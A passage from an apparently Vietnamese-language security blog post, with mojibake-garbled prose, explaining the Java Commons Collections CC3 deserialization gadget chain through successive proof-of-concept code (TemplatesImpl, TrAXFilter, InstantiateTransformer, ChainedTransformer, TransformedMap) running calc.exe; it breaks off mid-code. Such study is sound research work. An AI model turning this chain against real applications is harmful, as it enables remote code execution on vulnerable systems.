com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>á» CC2, chÃºng ta lá»£i dá»¥ng thá»±c thi hÃ m <code>newTransformer</code> thÃ´ng qua <code>InvokerTransformer.newTransform()</code>. CÃ²n vá»›i CC3 lÃ  gÃ¬ thÃ¬ chÃºng ta cÃ¹ng nhau Ä‘i tiáº¿p nÃ o.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2023/03/20/CommonsCollections3/TemplateImplNewTransform.png"></p><p>TÃ¬m kiáº¿m ta tháº¥y cÃ³ lá»›p TrAXFilter gá»i Ä‘áº¿n nÃ³ á»Ÿ trong hÃ m táº¡o.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2023/03/20/CommonsCollections3/TrAXFilter.png"></p><p>Äi Ä‘áº¿n hÃ m táº¡o cá»§a TrAXFilter phÃ¢n tÃ­ch má»™t chÃºt (phÃ¢n tÃ­ch trÆ°á»›c chá»© cÃ³ cÃ¡i cÃ³ thá»ƒ khÃ´ng xÃ i nhÃ©):</p><ul><li><code>_templates</code> lÃ  má»™t instance cá»§a interface <code>Templates</code> -&gt; <code>_templates</code> cÃ³ thá»ƒ lÃ  nhá»¯ng lá»›p implements <code>Templates</code> (VD TemplatesImpl)</li><li><code>_transformer</code> lÃ  má»™t instance cá»§a class <code>TransformerImpl</code> vÃ  á»Ÿ Ä‘Ã¢y nÃ³ cÃ³ thá»±c thi <code>_transformer = (TransformerImpl) templates.newTransformer();</code> -&gt; TÃ¬m class táº¡o ra TrAXFilter Ä‘á»ƒ nÃ³ thá»±c thi hÃ m táº¡o.</li></ul><h3 id="InstaniateTransformer"><a href="#InstaniateTransformer" class="headerlink" title="InstaniateTransformer"></a>InstaniateTransformer</h3><p>Theo chain nÃ y, chÃºng ta sáº½ dÃ¹ng lá»›p <code>InstantiateTransformer</code> Ä‘á»ƒ táº¡o <code>TrAXFilter</code> á»Ÿ hÃ m transform.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2023/03/20/CommonsCollections3/InstantiateTransformerTransform.png"></p><p>á» Ä‘Ã¢y thÃ¬ cÅ©ng khÃ¡ dá»… hiá»ƒu, trÆ°á»›c tiÃªn nÃ³ check Object mÃ¬nh truyá»n vÃ o cÃ³ pháº£i lÃ  instance Class hay khÃ´ng, váº­y thÃ¬ chÃºng ta pháº£i truyá»n Object loáº¡i khÃ¡c vá»›i Class.</p><p>Tiáº¿p theo hÃ m nÃ y sá»­ dá»¥ng reflection Ä‘á»ƒ táº¡o instance cá»§a má»™t lá»›p nÃ o Ä‘Ã³. MÃ¬nh sáº½ phÃ¢n tÃ­ch rÃµ nhÆ° sau:</p><ul><li><code>Constructor con = ((Class) input).getConstructor(iParamTypes);</code><ul><li><code>con</code> lÃ  constructer cá»§a <code>input</code> truyá»n vÃ o hÃ m transform.</li><li><code>iParamTypes</code> lÃ  máº£ng cÃ¡c kiá»ƒu dá»¯ liá»‡u truyá»n vÃ o constructor cá»§a lá»›p <code>TrAXFilter</code></li><li><code>iArgs</code> lÃ  máº£ng cÃ¡c tham sá»‘ truyá»n vÃ o constructor.</li></ul></li><li>Sau Ä‘Ã³ nÃ³ táº¡o instance cá»§a class cáº§n táº¡o báº±ng <code>con.newInstance(iArgs)</code></li></ul><p>NhÃ¬n vÃ o hÃ m táº¡o cá»§a <code>InstantiateTransformer</code> Ä‘á»ƒ xem cÃ¡c biáº¿n <code>iParamTypes</code>, <code>iArgs</code> Ä‘Æ°á»£c táº¡o nhÆ° nÃ o:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TÃ³m gá»n láº¡i Ã½ tÆ°á»Ÿng Ä‘áº¿n lÃºc nÃ y:<br>    * Ta cÃ³ <code>templates</code> lÃ  instance cá»§a <code>TemplateImpl</code> cáº§n thá»±c thi <code>newTransformer()</code><br>    * Táº¡o má»™t instace cá»§a <code>InstantiateTransformer</code> vá»›i <code>paramTypes</code> lÃ  máº£ng chá»©a kiá»ƒu Class cá»§a tham sá»‘ truyá»n vÃ o constructor <code>TrAXFilter</code> (new Class[]{Templates.class}). <code>args</code> lÃ  máº£ng chá»©a tham sá»‘ cáº§n truyá»n vÃ o constructor cá»§a <code>TrAXFilter</code> (new Object[]{templates})<br>    * Thá»±c thi <code>instantiateTransformer.transform(TrAXFilter.class)</code></p><p>Tá»« Ä‘Ã¢y ta cÃ³ má»™t POC nhá» nhÆ° sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ChainedTransformed"><a href="#ChainedTransformed" class="headerlink" title="ChainedTransformed"></a>ChainedTransformed</h3><p>TÆ°Æ¡ng tá»± nhÆ° <code>InvokerTransformer.transform</code>, <code>InstantiateTransformer</code> implements Transformer nÃªn tháº±ng nÃ y cÃ³ thá»ƒ cho vÃ o <code>ChainedTransformed</code>.<br>Lá»£i Ã­ch cá»§a viá»‡c nÃ y nhÆ° á»Ÿ cc1-TransformedMap mÃ¬nh Ä‘Ã£ nÃ³i Ä‘Ã³ lÃ  chÃºng ta cÃ³ thá»ƒ trá»±c tiáº¿p thá»±c thi mÃ  khÃ´ng cáº§n Ä‘iá»u khiá»ƒn Ä‘áº§u vÃ o cá»§a hÃ m <code>transform()</code> báº±ng cÃ¡ch sá»­ dá»¥ng <code>ConstantTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TÆ°Æ¡ng tá»± nhÆ° cc1, cÃ¡c báº¡n cÃ³ thá»ƒ nhÃ¬n vÃ o sÆ¡ Ä‘á»“ á»Ÿ Ä‘áº§u bÃ i viáº¿t, tá»« ChainedTransformed chÃºng ta cÃ³ hai hÆ°á»›ng Ä‘Ã³ lÃ  káº¿t há»£p vá»›i TransformedMap, hoáº·c Lazymap Ä‘á»ƒ táº¡o thÃ nh má»™t chain.</p><p>Hai cÃ¡i nÃ y mÃ¬nh Ä‘Ã£ cÃ³ bÃ i viáº¿t vá» nÃ³ nÃªn mÃ¬nh sáº½ dÃ¹ng láº¡i luÃ´n. Náº¿u muá»‘n giáº£i thÃ­ch kÄ© hÆ¡n thÃ¬ cÃ¡c báº¡n xem láº¡i á»Ÿ bÃ i viÃªt trÆ°á»›c nhÃ©~</p><h3 id="ChainedTransformed-TransformedMap"><a href="#ChainedTransformed-TransformedMap" class="headerlink" title="ChainedTransformed + TransformedMap"></a>ChainedTransformed + TransformedMap</h3><p>Tiáº¿p Ä‘áº¿n ta chá»‰ cáº§n thÃªm Ä‘oáº¡n nÃ y Ä‘á»ƒ trigger <code>ChainedTransformer.transform</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC Ä‘áº¿n giai Ä‘oáº¡n hiá»‡n táº¡i:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HoÃ n thiá»‡n chain:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 